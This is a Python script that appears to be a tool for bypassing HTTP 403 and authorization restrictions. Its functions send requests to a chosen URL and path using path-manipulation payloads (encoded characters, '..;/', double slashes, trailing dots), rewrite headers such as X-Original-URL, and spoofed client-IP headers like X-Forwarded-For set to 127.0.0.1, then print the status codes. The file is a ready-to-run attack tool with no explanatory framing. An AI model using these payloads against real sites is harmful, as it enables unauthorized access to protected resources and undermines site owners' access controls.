import requests


def add_url_encode(url,path):
    try:
        payload = (f"{url}/%e2/{path}")
        r = requests.get(payload,timeout=5)
        print(f"{payload} --> {r.status_code}")
    except:
        pass

def add_dot(url,path):
    try:
        payload = f"{url}/{path}/."
        r = requests.get(payload,timeout=5)
        print(f"{payload} --> {r.status_code}")
    except:
        pass

def add_two_slashes(url,path):
    try:
        payload = f"{url}//{path}//"
        r = requests.get(payload,timeout=5)
        print(f"{payload} --> {r.status_code}")
        payload = f"{url}//{path}"
        r = requests.get(payload,timeout=5)
        print(f"{payload} --> {r.status_code}")
    except:
        pass

def add_two_dots(url,path):
    try:
        payload = f"{url}/./{path}/./"
        r = requests.get(payload,timeout=5)
        print(f"{payload} --> {r.status_code}")
    except:
        pass

def add_original_header(url,path):
    try:
        payload = f"{url}/{path}/"
        r = requests.get(payload,headers={"X-Original-URL": f"{path}"},timeout=5)
        print(f"X-Original-URL --> {payload} --> {r.status_code}")
    except:
        pass



def rewrite(url,path):

    try:
        payload = f"{url}/{path}/"
        r = requests.get(payload,headers={"X-rewrite-url": f"{path}"},timeout=5)
        print(f"X-rewrite-url --> {payload} --> {r.status_code}")
    except:
        pass


def add_header(url,path):
    localip = "127.0.0.1"
    payloads = [
        "Forwarded","Forwarded-For","Forwarded-For-Ip",
        "X-Client-IP","X-Custom-IP-Authorization","X-Forward","X-Forwarded",
        "X-Forwarded-By","X-Forwarded-For","X-Forwarded-For-Original","X-Forwared-Host",
        "X-Host","X-Originating-IP","X-Remote-IP","X-Remote-Addr",
        "X-Forwarded-Server","X-HTTP-Host-Override"

    ]
    for payload in payloads:
        try:
            r = requests.get(f"{url}/{path}",headers={payload:localip},timeout=5)
            print(f"{payload}:{localip} --> {url}/{path} --> {r.status_code}")
        except:
            pass
    localip = "localhost"
    for payload in payloads:
        try:
            r = requests.get(f"{url}/{path}",headers={payload:localip},timeout=5)
            print(f"{payload}:{localip} --> {url}/{path} --> {r.status_code}")
        except:
            pass

def add_space_url_encode(url,path):
    try:
        payload = f"{url}/{path}%20"
        r = requests.get(payload,timeout=5)
        print(f"{payload} --> {r.status_code}")
    except:
        pass
    try:
        payload = f"{url}/{path}%09"
        r = requests.get(payload,timeout=5)
        print(f"{payload} --> {r.status_code}")
    except:
        pass
    try:
        payload = f"{url}/{path}?"
        r = requests.get(payload,timeout=5)
        print(f"{payload} --> {r.status_code}")
    except:
        pass

    try:
        payload = f"{url}/{path}.html"
        r = requests.get(payload,timeout=5)
        print(f"{payload} --> {r.status_code}")
    except:
        pass
    
    try:
        payload = f"{url}/{path}?asds"
        r = requests.get(payload,timeout=5)
        print(f"{payload} --> {r.status_code}")
    except:
        pass
    
    try:
        payload = f"{url}/{path}#"
        r = requests.get(payload,timeout=5)
        print(f"{payload} --> {r.status_code}")
    except:
        pass

def post_content_lenght(url,path):
    try:
        r = requests.post(f"{url}/{path}",headers={"Content-Length": "0"},timeout=5)
        print(f"Content-Length: 0 --> {url}/{path} --> {r.status_code}")
    except:
        pass

def pathManipulating(url,PATH):
    payloads = [
        PATH+'?',
        PATH+'??',
        PATH+'&',
        PATH+'%',
        PATH+'%20',
        PATH+'%09',
        PATH+'/',
        PATH+'..;/',
        './'+PATH,
        './'+PATH+'/',
        PATH+'//',
        PATH+';/',
        PATH+'/*',
        PATH+'/.',
        PATH+'./.',
        PATH+'/./',
        PATH+'%23',
        PATH+'~',
        PATH+'/~',
        PATH+'.json',
    ]
    for payload in payloads:
        my_payload = f"{url}/{payload}"
        r = requests.get(my_payload)
        print(f"{my_payload} --> {r.status_code}")